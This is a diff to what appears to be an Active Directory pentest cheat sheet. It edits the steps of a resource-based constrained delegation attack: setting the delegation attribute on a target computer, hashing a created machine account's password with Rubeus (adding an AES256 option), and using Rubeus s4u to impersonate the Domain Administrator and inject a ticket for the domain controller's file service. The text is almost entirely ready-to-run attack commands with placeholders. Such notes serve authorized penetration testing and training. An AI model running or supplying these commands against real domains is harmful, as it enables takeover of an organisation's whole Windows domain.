@@ -578,7 +578,9 @@ Get-DomainComputer <target_machine> | Set-DomainObject -Set @{'msds-allowedtoact
 
 # Use rubeus to get the RC4 hash of the machine account
 .\rubeus.exe hash /password:<machine_password>
-#extract the rce4_hmac value ==> <rc4_hash>
+# Or aes256
+.\rubeus.exe hash /password:<machine_password> /domain:DOMAIN.FQDN /user:<created_machine$>
+#extract the rc4_hmac/aes256_cts_hmac_sha1 value ==> <rc4_hash>
 
 # Execute the impersonation and get a TGS as Domain Administrator for the service cifs on the DC
 .\rubeus.exe s4u /user:<created_machine$> /rc4:<rc4_hash> /impersonateuser:<target_user(Administrator)> /msdsspn:cifs/<target_machine.DOMAIN.FQDN> /domain:DOMAIN.FQDN /ptt
